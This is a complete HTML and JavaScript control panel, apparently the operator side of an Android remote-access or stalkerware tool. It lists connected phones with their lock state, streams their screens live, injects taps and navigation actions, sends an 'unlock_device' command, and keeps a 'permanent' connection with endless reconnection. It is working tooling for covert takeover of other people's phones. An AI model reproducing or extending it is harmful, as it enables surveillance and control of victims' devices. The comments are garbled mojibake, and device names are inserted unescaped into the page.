<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Screen Control - Live View</title>
    <style>
        /* ... ‡§™‡§π‡§≤‡•á ‡§µ‡§æ‡§≤‡§æ CSS ‡§ï‡•ã‡§° ‡§µ‡§π‡•Ä ‡§∞‡§π‡•á‡§ó‡§æ ... */
        /* ‡§∏‡§ø‡§∞‡•ç‡§´ ‡§ï‡•Å‡§õ ‡§®‡§à classes add ‡§ï‡§∞‡•á‡§Ç */
        
        .device-connection-status {
            font-size: 0.8em;
            margin-top: 5px;
        }
        .connection-quality {
            display: inline-block;
            width: 60px;
            height: 5px;
            background: #333;
            border-radius: 3px;
            overflow: hidden;
            margin-left: 5px;
        }
        .connection-quality-bar {
            height: 100%;
            background: #44ff44;
            width: 100%;
            transition: width 0.3s;
        }
        .device-stats {
            font-size: 0.7em;
            color: #888;
            margin-top: 2px;
        }
        .reconnecting {
            animation: pulse 1.5s infinite;
            color: #ffaa00;
        }
        @keyframes pulse {
            0% { opacity: 0.4; }
            50% { opacity: 1; }
            100% { opacity: 0.4; }
        }
    </style>
</head>
<body>

    <div id="device-list-view" class="view active">
        <div class="header"><h1>üîì PERMANENT CONNECTION CONTROL</h1></div>
        <div id="device-list-container"><ul id="device-list"></ul></div>
    </div>

    <div id="control-view" class="view">
        <div class="control-header">
            <button id="back-to-list-btn">‚Üê Back</button>
            <h2 id="device-title"></h2>
            <div class="lock-info" id="lock-status">Lock: Unknown</div>
            <div class="screen-toggle-buttons">
                <button id="btn-black-screen" class="screen-toggle-btn">üì¶ Elements</button>
                <button id="btn-live-screen" class="screen-toggle-btn active">üì± Live</button>
            </div>
            <div class="status-indicator">
                <div id="live-indicator" class="live-indicator"></div>
                <span id="stream-status">Stream: Off</span>
            </div>
            <div class="connection-status">
                <div id="connection-dot" class="connection-dot disconnected"></div>
                <span id="connection-status-text">...</span>
                <div class="connection-stats" id="connection-stats"></div>
            </div>
            <div id="device-connection-quality" class="connection-quality" style="display: none;">
                <div class="connection-quality-bar"></div>
            </div>
            <button id="btn-wake-unlock" class="single-main-btn">‚ö° WAKE</button>
        </div>
        <div class="main-container">
            <div class="screen-area">
                <div id="black-screen-viewport" class="screen-viewport" style="display: none;">
                    <div id="black-screen-container" class="screen-container"></div>
                </div>
                <div id="live-screen-viewport" class="screen-viewport" style="display: block;">
                    <img id="live-screen-image" class="live-screen-image" src="" alt="Live Screen" />
                </div>
            </div>
            <div class="all-controls">
                <button class="control-button" id="btn-scroll-up">‚Üë</button>
                <button class="control-button" id="btn-scroll-left">‚Üê</button>
                <button class="control-button" id="btn-scroll-right">‚Üí</button>
                <button class="control-button" id="btn-scroll-down">‚Üì</button>
                <div class="divider"></div>
                <button class="control-button" id="btn-back">‚Æå</button>
                <button class="control-button" id="btn-home">‚åÇ</button>
                <button class="control-button" id="btn-recents">‚ñ°</button>
                <div class="divider"></div>
                <button class="control-button" id="btn-start-stream">‚ñ∂Ô∏è</button>
                <button class="control-button" id="btn-stop-stream">‚è∏Ô∏è</button>
                <button class="control-button" id="btn-reconnect-device" style="background: #ffaa00;">üîó</button>
            </div>
        </div>
    </div>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io({
            reconnection: true,
            reconnectionAttempts: Infinity,
            reconnectionDelay: 1000,
            reconnectionDelayMax: 10000,
            randomizationFactor: 0.3,
            timeout: 20000,
            transports: ['websocket'],
            autoConnect: true
        });

        const UIElements = {
            deviceListView: document.getElementById('device-list-view'),
            controlView: document.getElementById('control-view'),
            deviceList: document.getElementById('device-list'),
            deviceTitle: document.getElementById('device-title'),
            lockStatus: document.getElementById('lock-status'),
            backToListBtn: document.getElementById('back-to-list-btn'),
            blackScreenBtn: document.getElementById('btn-black-screen'),
            liveScreenBtn: document.getElementById('btn-live-screen'),
            blackScreenViewport: document.getElementById('black-screen-viewport'),
            liveScreenViewport: document.getElementById('live-screen-viewport'),
            blackScreenContainer: document.getElementById('black-screen-container'),
            liveScreenImage: document.getElementById('live-screen-image'),
            connectionDot: document.getElementById('connection-dot'),
            connectionStatusText: document.getElementById('connection-status-text'),
            connectionStats: document.getElementById('connection-stats'),
            liveIndicator: document.getElementById('live-indicator'),
            streamStatus: document.getElementById('stream-status'),
            deviceConnectionQuality: document.getElementById('device-connection-quality')
        };

        let state = {
            devices: {},
            activeDeviceId: null,
            connectionStartTime: 0,
            isLiveStreaming: false,
            currentScreenView: 'live',
            lastPingTime: 0,
            connectionQuality: 100,
            deviceConnectionStats: {},
            reconnectAttempts: 0
        };

        // Connection quality calculator
        function calculateConnectionQuality(deviceId) {
            const device = state.devices[deviceId];
            if (!device) return 100;
            
            let quality = 100;
            
            // Disconnections penalty
            if (device.disconnections > 0) {
                quality -= Math.min(device.disconnections * 5, 30);
            }
            
            // Last seen penalty
            if (device.lastSeen) {
                const secondsAgo = (Date.now() - device.lastSeen) / 1000;
                if (secondsAgo > 30) {
                    quality -= Math.min((secondsAgo - 30) * 2, 40);
                }
            }
            
            // Heartbeat regularity
            if (device.lastHeartbeat && device.heartbeatInterval) {
                const expected = device.lastHeartbeat + device.heartbeatInterval;
                const delay = Date.now() - expected;
                if (delay > 5000) {
                    quality -= Math.min(delay / 1000, 20);
                }
            }
            
            return Math.max(10, Math.min(100, quality));
        }

        function showView(viewId) {
            UIElements.deviceListView.classList.remove('active');
            UIElements.controlView.classList.remove('active');
            document.getElementById(viewId).classList.add('active');
        }

        function switchScreenView(viewType) {
            state.currentScreenView = viewType;
            if (viewType === 'black') {
                UIElements.blackScreenBtn.classList.add('active');
                UIElements.liveScreenBtn.classList.remove('active');
                UIElements.blackScreenViewport.style.display = 'block';
                UIElements.liveScreenViewport.style.display = 'none';
                stopLiveStream();
            } else {
                UIElements.blackScreenBtn.classList.remove('active');
                UIElements.liveScreenBtn.classList.add('active');
                UIElements.blackScreenViewport.style.display = 'none';
                UIElements.liveScreenViewport.style.display = 'block';
                startLiveStream();
            }
        }

        function sendCommand(action, payload = {}) {
            if (!state.activeDeviceId || !socket.connected) {
                console.warn('Cannot send command: No active device or disconnected');
                return;
            }
            
            // Add sequence number for tracking
            const sequence = Date.now();
            payload._seq = sequence;
            
            socket.emit('command_to_device', { 
                deviceId: state.activeDeviceId, 
                action, 
                payload 
            });
            
            console.log(`üì§ Sent ${action} to ${state.activeDeviceId}, seq: ${sequence}`);
        }

        function startLiveStream() {
            if (state.isLiveStreaming) return;
            state.isLiveStreaming = true;
            sendCommand('start_live_stream');
            UIElements.liveIndicator.classList.add('active');
            UIElements.streamStatus.textContent = 'Stream: On';
        }

        function stopLiveStream() {
            if (!state.isLiveStreaming) return;
            state.isLiveStreaming = false;
            sendCommand('stop_live_stream');
            UIElements.liveIndicator.classList.remove('active');
            UIElements.streamStatus.textContent = 'Stream: Off';
        }

        function updateDeviceInList(device) {
            state.devices[device.deviceId] = { 
                ...state.devices[device.deviceId], 
                ...device,
                lastUpdated: Date.now()
            };
            
            // Calculate connection quality
            const quality = calculateConnectionQuality(device.deviceId);
            state.devices[device.deviceId].connectionQuality = quality;
            
            let li = document.getElementById(`device-${device.deviceId}`);
            if (!li) {
                li = document.createElement('li');
                li.className = 'device';
                li.id = `device-${device.deviceId}`;
                li.addEventListener('click', () => {
                    if (state.devices[device.deviceId].socketId) {
                        state.activeDeviceId = device.deviceId;
                        UIElements.deviceTitle.textContent = device.deviceName;
                        UIElements.lockStatus.textContent = `Lock: ${device.lockType || 'Unknown'}`;
                        
                        // Show connection quality
                        UIElements.deviceConnectionQuality.style.display = 'block';
                        updateConnectionQualityDisplay(quality);
                        
                        showView('control-view');
                        switchScreenView('live');
                    } else {
                        alert('Device is currently offline. Please wait for it to reconnect.');
                    }
                });
                UIElements.deviceList.appendChild(li);
            }
            
            const isOnline = !!device.socketId;
            const batteryLevel = device.battery || 'N/A';
            const connectionStatus = isOnline ? 'Online' : 'Offline';
            const statusClass = isOnline ? '' : 'reconnecting';
            
            li.innerHTML = `
                <div>
                    <div class="device-name ${statusClass}">${device.deviceName}</div>
                    <div class="device-info">Android: ${device.androidVersion} | üîã ${batteryLevel}%</div>
                    <div class="device-connection-status ${statusClass}">
                        ${connectionStatus} 
                        <div class="connection-quality">
                            <div class="connection-quality-bar" style="width: ${quality}%"></div>
                        </div>
                    </div>
                    <div class="device-stats">
                        ${device.lastSeen ? 'Seen: ' + formatTimeAgo(device.lastSeen) : ''}
                        ${device.disconnections > 0 ? ' | D/C: ' + device.disconnections : ''}
                    </div>
                </div>
                <div style="display: flex; align-items: center;">
                    <span class="lock-badge ${device.lockType !== 'locked' ? 'unlocked' : ''}">${device.lockType || 'none'}</span>
                    <span class="status-dot" style="background-color: ${isOnline ? '#28a745' : '#ff4444'}; box-shadow: 0 0 8px ${isOnline ? '#28a745' : '#ff4444'}"></span>
                </div>
            `;
        }

        function updateConnectionQualityDisplay(quality) {
            const bar = UIElements.deviceConnectionQuality.querySelector('.connection-quality-bar');
            if (bar) {
                bar.style.width = quality + '%';
                bar.style.backgroundColor = quality > 70 ? '#44ff44' : 
                                           quality > 40 ? '#ffaa00' : '#ff4444';
            }
        }

        function formatTimeAgo(timestamp) {
            const seconds = Math.floor((Date.now() - timestamp) / 1000);
            if (seconds < 60) return seconds + 's ago';
            if (seconds < 3600) return Math.floor(seconds / 60) + 'm ago';
            return Math.floor(seconds / 3600) + 'h ago';
        }

        // Socket.IO event handlers
        socket.on('connect', () => {
            console.log('‚úÖ Connected to server!');
            UIElements.connectionDot.className = 'connection-dot connected';
            UIElements.connectionStatusText.textContent = 'Connected';
            state.connectionStartTime = Date.now();
            state.reconnectAttempts = 0;
            socket.emit('admin_join');
        });

        socket.on('disconnect', (reason) => {
            console.error('‚ùå Disconnected from server! Reason:', reason);
            UIElements.connectionDot.className = 'connection-dot disconnected';
            UIElements.connectionStatusText.textContent = 'Disconnected - ' + reason;
            state.reconnectAttempts++;
        });

        socket.on('reconnect', (attemptNumber) => {
            console.log('üîÑ Reconnected after', attemptNumber, 'attempts');
            UIElements.connectionDot.className = 'connection-dot connected';
            UIElements.connectionStatusText.textContent = 'Reconnected';
        });

        socket.on('reconnect_attempt', (attemptNumber) => {
            console.log('üîÑ Reconnect attempt', attemptNumber);
            UIElements.connectionStatusText.textContent = 'Reconnecting... (' + attemptNumber + ')';
        });

        socket.on('reconnect_error', (error) => {
            console.error('üîÑ Reconnect error:', error);
        });

        socket.on('reconnect_failed', () => {
            console.error('üîÑ Reconnect failed');
            UIElements.connectionStatusText.textContent = 'Connection failed';
        });

        socket.on('ping', () => {
            state.lastPingTime = Date.now();
        });

        socket.on('pong', (latency) => {
            const currentLatency = Date.now() - state.lastPingTime;
            state.connectionQuality = Math.max(10, 100 - currentLatency / 10);
        });

        socket.on('device_list', (initialDevices) => {
            UIElements.deviceList.innerHTML = '';
            state.devices = {};
            initialDevices.forEach(device => {
                if (device && device.deviceId) {
                    updateDeviceInList(device);
                }
            });
        });

        socket.on('new_device_joined', updateDeviceInList);

        socket.on('device_disconnected', (deviceId) => {
            const el = document.getElementById(`device-${deviceId}`);
            if (el) {
                el.querySelector('.status-dot').style.backgroundColor = '#ff4444';
                el.querySelector('.device-name').classList.add('reconnecting');
            }
            if (state.devices[deviceId]) {
                state.devices[deviceId].socketId = null;
            }
        });

        socket.on('device_offline', (data) => {
            if (state.devices[data.deviceId]) {
                state.devices[data.deviceId].socketId = null;
                state.devices[data.deviceId].lastSeen = data.lastSeen;
                updateDeviceInList(state.devices[data.deviceId]);
                
                if (state.activeDeviceId === data.deviceId) {
                    UIElements.deviceConnectionQuality.style.display = 'none';
                    alert('Device went offline. It will reconnect automatically.');
                }
            }
        });

        socket.on('device_heartbeat', (data) => {
            if (state.devices[data.deviceId]) {
                updateDeviceInList({...state.devices[data.deviceId], ...data});
                if (data.deviceId === state.activeDeviceId) {
                    UIElements.lockStatus.textContent = `Lock: ${data.lockType || 'Unknown'}`;
                    updateConnectionQualityDisplay(state.devices[data.deviceId].connectionQuality || 100);
                }
            }
        });

        socket.on('screen_update', (data) => {
            if (data.deviceId !== state.activeDeviceId || state.currentScreenView !== 'black') return;
            // Black screen logic
        });

        socket.on('live_screen', (data) => {
            if (data.deviceId !== state.activeDeviceId || state.currentScreenView !== 'live') return;
            
            // Update connection quality based on frame rate
            const now = Date.now();
            if (state.devices[data.deviceId]) {
                const lastFrame = state.devices[data.deviceId].lastFrameTime || 0;
                const frameDelay = now - lastFrame;
                
                if (lastFrame > 0 && frameDelay > 0) {
                    const fps = 1000 / frameDelay;
                    if (fps < 1) {
                        state.devices[data.deviceId].connectionQuality = 
                            Math.max(10, (state.devices[data.deviceId].connectionQuality || 100) - 5);
                    }
                }
                
                state.devices[data.deviceId].lastFrameTime = now;
                updateConnectionQualityDisplay(state.devices[data.deviceId].connectionQuality || 100);
            }
            
            UIElements.liveScreenImage.src = `data:image/jpeg;base64,${data.liveImage}`;
        });

        // UI Event Listeners
        UIElements.backToListBtn.onclick = () => {
            stopLiveStream();
            state.activeDeviceId = null;
            UIElements.deviceConnectionQuality.style.display = 'none';
            showView('device-list-view');
        };
        
        UIElements.blackScreenBtn.onclick = () => switchScreenView('black');
        UIElements.liveScreenBtn.onclick = () => switchScreenView('live');
        
        UIElements.liveScreenImage.addEventListener('click', (e) => {
            const rect = e.target.getBoundingClientRect();
            const scaleX = e.target.naturalWidth / rect.width;
            const scaleY = e.target.naturalHeight / rect.height;
            const x = Math.round((e.clientX - rect.left) * scaleX);
            const y = Math.round((e.clientY - rect.top) * scaleY);
            sendCommand('touch_command', { x, y });
        });

        // Control buttons
        document.getElementById('btn-start-stream').onclick = startLiveStream;
        document.getElementById('btn-stop-stream').onclick = stopLiveStream;
        document.getElementById('btn-wake-unlock').onclick = () => sendCommand('unlock_device');
        document.getElementById('btn-back').onclick = () => sendCommand('global_action', { action: 'back' });
        document.getElementById('btn-home').onclick = () => sendCommand('global_action', { action: 'home' });
        document.getElementById('btn-recents').onclick = () => sendCommand('global_action', { action: 'recents' });
        document.getElementById('btn-scroll-up').onclick = () => sendCommand('scroll_action', { direction: 'up' });
        document.getElementById('btn-scroll-down').onclick = () => sendCommand('scroll_action', { direction: 'down' });
        document.getElementById('btn-scroll-left').onclick = () => sendCommand('scroll_action', { direction: 'left' });
        document.getElementById('btn-scroll-right').onclick = () => sendCommand('scroll_action', { direction: 'right' });
        document.getElementById('btn-reconnect-device').onclick = () => {
            if (state.activeDeviceId && state.devices[state.activeDeviceId]) {
                const device = state.devices[state.activeDeviceId];
                alert(`Device ${device.deviceName} will attempt to reconnect.`);
            }
        };

        // Update connection stats
        setInterval(() => {
            if (socket.connected) {
                const uptime = Math.floor((Date.now() - state.connectionStartTime) / 1000);
                const hours = Math.floor(uptime / 3600);
                const minutes = Math.floor((uptime % 3600) / 60);
                const seconds = uptime % 60;
                UIElements.connectionStats.textContent = `Uptime: ${hours}h ${minutes}m ${seconds}s`;
                
                // Update connection quality for active device
                if (state.activeDeviceId && state.devices[state.activeDeviceId]) {
                    const quality = calculateConnectionQuality(state.activeDeviceId);
                    updateConnectionQualityDisplay(quality);
                }
            }
        }, 1000);

        // Auto-refresh device list every 30 seconds
        setInterval(() => {
            if (socket.connected && UIElements.deviceListView.classList.contains('active')) {
                // Re-send admin join to refresh list
                socket.emit('admin_join');
            }
        }, 30000);
    </script>
</body>
</html>
